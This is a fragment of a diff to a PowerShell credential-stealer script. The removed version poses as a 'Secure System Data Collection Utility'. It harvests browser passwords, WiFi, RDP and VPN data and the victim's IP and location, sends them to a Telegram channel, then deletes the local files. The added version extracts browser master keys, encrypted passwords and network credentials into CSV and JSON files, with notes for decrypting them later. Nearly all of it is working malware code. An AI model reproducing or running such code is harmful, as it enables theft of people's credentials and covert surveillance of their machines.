+            DetailedData = $encryptedData
+        }
+    } catch {
+        Write-Host "Error extracting network credentials: $_" -ForegroundColor Red
+        return @{
+            Summary = @()
+            DetailedData = @()
         }
     }
-    
-    return $browserPaths
 }
 
 # Main execution
-Write-Host "Secure System Data Collection Utility" -ForegroundColor Green
-Write-Host "=====================================" -ForegroundColor Green
-
-# Collect all data
-$networkInfo = Get-NetworkLocationData
-$systemSpecs = Get-SystemSpecifications
-$userProfile = Get-UserProfileData
-$wirelessData = Get-WirelessNetworkData
-$remoteConnections = Get-RemoteConnectionData
-
-$timestamp = Get-Date -Format "ddMMyyyy"
-$uniqueId = [System.Guid]::NewGuid().ToString().Substring(0, 8)
-$filePrefix = "$($networkInfo.PublicIP)_$($networkInfo.Country)_$($networkInfo.Region)_${timestamp}_${uniqueId}"
-
-$browserDataPath = Join-Path $PWD "${filePrefix}_browser_data.json"
-$systemDataPath = Join-Path $PWD "${filePrefix}_system_data.json"
-
-Write-Host "Data collection completed" -ForegroundColor Green
-Write-Host "Files will be created as:" -ForegroundColor Yellow
-Write-Host "Browser Data: $browserDataPath" -ForegroundColor Cyan
-Write-Host "System Data: $systemDataPath" -ForegroundColor Cyan
-
-# Install SQLite if needed
 if (-not (Test-Path ".\sqlite3.exe")) {
-    if (-not (Install-DatabaseTool)) {
-        Write-Host "Database tool required. Exiting." -ForegroundColor Red
-        exit 1
+    if (-not (Install-SQLiteIfNeeded)) {
+        Write-Host "SQLite3 is required for browser extraction. Continuing with network credentials only." -ForegroundColor Yellow
     }
 }
 
-# Extract browser data from ALL available browsers
-$browserData = @{}
-$allBrowserPaths = Get-AllBrowserPaths
+Write-Host "Starting credential extraction..." -ForegroundColor Green
 
-Write-Host "`nFound $($allBrowserPaths.Count) browsers to process:" -ForegroundColor Yellow
-$allBrowserPaths.GetEnumerator() | ForEach-Object { Write-Host "  - $($_.Key): $($_.Value)" -ForegroundColor Cyan }
+$allSummaryData = @()
+$allDetailedData = @()
+$allMasterKeys = @()
 
-foreach ($browserEntry in $allBrowserPaths.GetEnumerator()) {
-    $browserName = $browserEntry.Key
-    $browserPath = $browserEntry.Value
+# Process browsers
+foreach ($browserKey in $browsers.Keys) {
+    $browser = $browsers[$browserKey]
+    Write-Host "`nProcessing $($browser.Name)..." -ForegroundColor Yellow
+    Write-Host "Path: $($browser.Path)" -ForegroundColor Gray
     
-    Write-Host "`nProcessing $browserName..." -ForegroundColor Yellow
-    $result = Get-BrowserStorageData -BrowserDataPath $browserPath -BrowserName $browserName
-    $browserData[$browserName] = $result
+    # Extract master key
+    $masterKeyInfo = Get-BrowserMasterKey -BrowserDataPath $browser.Path -BrowserName $browser.Name
+    if ($masterKeyInfo) {
+        $allMasterKeys += $masterKeyInfo
+    }
     
-    if ($result.TotalEntries -gt 0) {
-        Write-Host "  ✓ Found $($result.TotalEntries) credentials" -ForegroundColor Green
-    } else {
-        Write-Host "  ✗ No credentials found" -ForegroundColor Red
-    }
-}
-
-# Create consolidated data files
-$consolidatedBrowserData = @{
-    Metadata = @{
-        ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-        PublicIP = $networkInfo.PublicIP
-        Country = $networkInfo.Country
-        Region = $networkInfo.Region
-        City = $networkInfo.City
-        ComputerName = $systemSpecs.ComputerName
-        UserName = $systemSpecs.UserName
-        TotalBrowsers = $allBrowserPaths.Count
-        TotalCredentials = ($browserData.Values | ForEach-Object { $_.TotalEntries } | Measure-Object -Sum).Sum
-    }
-    BrowserData = $browserData
-}
-
-$consolidatedSystemData = @{
-    Metadata = @{
-        ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-        PublicIP = $networkInfo.PublicIP
-        Country = $networkInfo.Country
-        Region = $networkInfo.Region
-        City = $networkInfo.City
-    }
-    SystemSpecifications = $systemSpecs
-    UserProfile = $userProfile
-    WirelessNetworks = $wirelessData
-    RemoteConnections = $remoteConnections
-}
-
-# Export to JSON files
-$consolidatedBrowserData | ConvertTo-Json -Depth 10 | Out-File -FilePath $browserDataPath -Encoding UTF8
-$consolidatedSystemData | ConvertTo-Json -Depth 10 | Out-File -FilePath $systemDataPath -Encoding UTF8
-
-Write-Host "JSON files created successfully" -ForegroundColor Green
-
-# Wait for files to be written
-Write-Host "Finalizing file preparation..." -ForegroundColor Yellow
-Start-Sleep -Seconds 3
-
-# Test Telegram connection first
-Write-Host "Testing Telegram connection..." -ForegroundColor Yellow
-$testResult = Send-SecureNotification -MessageText "🖥️ System Data Collection Started - Connection Test"
-
-if (-not $testResult) {
-    Write-Host "Telegram connection failed. Trying alternative channel format..." -ForegroundColor Yellow
-    # Try with -100 prefix
-    $originalChannel = $CommChannel
-    $CommChannel = "-100$CommChannel"
-    $testResult = Send-SecureNotification -MessageText "🖥️ System Data Collection Started - Alternative Format Test"
+    # Extract encrypted passwords
+    $extractionResult = Get-BrowserEncryptedPasswords -BrowserDataPath $browser.Path -BrowserName $browser.Name -BrowserKey $browserKey
+    $allSummaryData += $extractionResult.Summary
+    $allDetailedData += $extractionResult.DetailedData
     
-    if (-not $testResult) {
-        Write-Host "All Telegram delivery attempts failed. Files saved locally." -ForegroundColor Red
-        Write-Host "Browser Data: $browserDataPath" -ForegroundColor Cyan
-        Write-Host "System Data: $systemDataPath" -ForegroundColor Cyan
-    } else {
-        Write-Host "Alternative channel format works! Using: $CommChannel" -ForegroundColor Green
-    }
+    Write-Host "Finished processing $($browser.Name): $($extractionResult.Summary.Count) entries found" -ForegroundColor Green
 }
 
-if ($testResult) {
-    # Send initial notification
-    $initialMessage = @"
-🖥️ <b>System Data Collection Started</b>
-• <b>Computer:</b> $($systemSpecs.ComputerName)
-• <b>User:</b> $($systemSpecs.UserName)
-• <b>Location:</b> $($networkInfo.City), $($networkInfo.Region)
-• <b>IP:</b> $($networkInfo.PublicIP)
-• <b>Time:</b> $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
-"@
+# Extract network credentials
+$networkResult = Get-NetworkCredentials
+$allSummaryData += $networkResult.Summary
+$allDetailedData += $networkResult.DetailedData
 
-    Send-SecureNotification -MessageText $initialMessage | Out-Null
-
-    # Send files
-    $browserDescription = "🌐 Browser Data - $($systemSpecs.ComputerName) - $($networkInfo.PublicIP)"
-    $systemDescription = "🖥️ System Data - $($systemSpecs.ComputerName) - $($networkInfo.PublicIP)"
-
-    $browserSent = Invoke-SecureDelivery -ContentPath $browserDataPath -Description $browserDescription
-    $systemSent = Invoke-SecureDelivery -ContentPath $systemDataPath -Description $systemDescription
-
-    # Send completion notification
-    $totalCredentials = ($browserData.Values | ForEach-Object { $_.TotalEntries } | Measure-Object -Sum).Sum
-    $completionMessage = @"
-✅ <b>Data Collection Completed</b>
-
-📊 <b>Summary:</b>
-• Browsers processed: $($allBrowserPaths.Count)
-• Total credentials: $totalCredentials
-• WiFi networks: $($wirelessData.TotalNetworks)
-• RDP connections: $($remoteConnections.RDPConnections.Count)
-• VPN configurations: $($remoteConnections.VPNConnections.Count)
-
-🌍 <b>Location:</b> $($networkInfo.City), $($networkInfo.Region)
-🖥️ <b>System:</b> $($systemSpecs.ComputerName)
-⏰ <b>Completed:</b> $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
-"@
-
-    Send-SecureNotification -MessageText $completionMessage | Out-Null
+# Export results
+if ($allSummaryData.Count -gt 0) {
+    Write-Host "`nSuccessfully extracted $($allSummaryData.Count) credentials!" -ForegroundColor Green
+    
+    # Export summary to CSV
+    try {
+        $allSummaryData | Export-Csv -Path $CSVPath -NoTypeInformation -Encoding UTF8 -Force
+        Write-Host "Summary exported to: $CSVPath" -ForegroundColor Green
+    } catch {
+        Write-Host "CSV export failed: $_" -ForegroundColor Red
+    }
+    
+    # Export detailed data to JSON
+    try {
+        $exportData = @{
+            Metadata = @{
+                ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                TotalEntries = $allSummaryData.Count
+                OS = [System.Environment]::OSVersion.VersionString
+                User = [System.Environment]::UserName
+                Machine = [System.Environment]::MachineName
+            }
+            MasterKeys = $allMasterKeys
+            Credentials = $allDetailedData
+        }
+        
+        $exportData | ConvertTo-Json -Depth 10 | Out-File -FilePath $JSONPath -Encoding UTF8
+        Write-Host "Detailed data exported to: $JSONPath" -ForegroundColor Green
+    } catch {
+        Write-Host "JSON export failed: $_" -ForegroundColor Red
+    }
+    
+    # Summary by type
+    Write-Host "`nExtraction Summary by Type:" -ForegroundColor Cyan
+    $typeStats = $allSummaryData | Group-Object Type | ForEach-Object {
+        [PSCustomObject]@{
+            Type = $_.Name
+            Count = $_.Count
+            Percentage = "$([math]::Round(($_.Count / $allSummaryData.Count) * 100, 2))%"
+        }
+    }
+    
+    $typeStats | Format-Table -AutoSize
+    
+    # Summary by browser (for browser credentials)
+    Write-Host "Browser Credential Summary:" -ForegroundColor Cyan
+    $browserStats = $allSummaryData | Where-Object { $_.Type -eq "Browser" } | Group-Object Browser | ForEach-Object {
+        [PSCustomObject]@{
+            Browser = $_.Name
+            Count = $_.Count
+            Percentage = "$([math]::Round(($_.Count / $allSummaryData.Count) * 100, 2))%"
+        }
+    }
+    
+    $browserStats | Format-Table -AutoSize
+    
+    # Encryption version summary (for browser credentials)
+    Write-Host "Encryption Version Summary (Browsers):" -ForegroundColor Cyan
+    $encryptionStats = $allSummaryData | Where-Object { $_.Type -eq "Browser" } | Group-Object EncryptionVersion | ForEach-Object {
+        [PSCustomObject]@{
+            Version = if ($_.Name) { $_.Name } else { "Unknown" }
+            Count = $_.Count
+            Percentage = "$([math]::Round(($_.Count / $allSummaryData.Count) * 100, 2))%"
+        }
+    }
+    
+    $encryptionStats | Format-Table -AutoSize
+    
+    # Sample of extracted data
+    Write-Host "`nSample of extracted data (first 5 entries):" -ForegroundColor Cyan
+    $allSummaryData | Select-Object -First 5 | Format-Table -Property Type, Browser, Profile, URL, Username, EncryptionVersion, DataLength -AutoSize
+    
+    # Important information
+    Write-Host "`nIMPORTANT FOR FUTURE DECRYPTION:" -ForegroundColor Yellow
+    Write-Host "1. Keep the JSON file safe - it contains all encrypted data" -ForegroundColor Yellow
+    Write-Host "2. Browser master keys and network credentials are encrypted with DPAPI" -ForegroundColor Yellow
+    Write-Host "3. To decrypt in the future, you'll need:" -ForegroundColor Yellow
+    Write-Host "   - This JSON file" -ForegroundColor Yellow
+    Write-Host "   - Access to the same Windows user account" -ForegroundColor Yellow
+    Write-Host "   - The browser data directories (for browser credentials)" -ForegroundColor Yellow
+    Write-Host "4. Different browsers may use different encryption versions" -ForegroundColor Yellow
+    Write-Host "5. Network credentials may require additional tools for decryption" -ForegroundColor Yellow
+    
+} else {
+    Write-Host "No credentials found." -ForegroundColor Yellow
 }
 
 # Cleanup
-Write-Host "Performing cleanup..." -ForegroundColor Yellow
-Get-ChildItem -Path "." -Filter "temp_*" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-Get-ChildItem -Path "." -Filter "*.db" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-Get-ChildItem -Path "." -Filter "*.csv" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path "." -Filter "temp_*.db" -ErrorAction SilentlyContinue | Remove-Item -Force
+Get-ChildItem -Path "." -Filter "temp_*.csv" -ErrorAction SilentlyContinue | Remove-Item -Force
+Write-Host "Temporary files cleaned up." -ForegroundColor Green
 
-# Remove JSON files after sending if successful
-if ($testResult) {
-    if (Test-Path $browserDataPath) { Remove-Item $browserDataPath -Force -ErrorAction SilentlyContinue }
-    if (Test-Path $systemDataPath) { Remove-Item $systemDataPath -Force -ErrorAction SilentlyContinue }
-} else {
-    Write-Host "Files preserved locally due to delivery failure" -ForegroundColor Yellow
-}
-
-Write-Host "Cleanup completed" -ForegroundColor Green
-Write-Host "`nData collection and transmission finished successfully" -ForegroundColor Green
+Write-Host "`nCredential extraction completed." -ForegroundColor Green
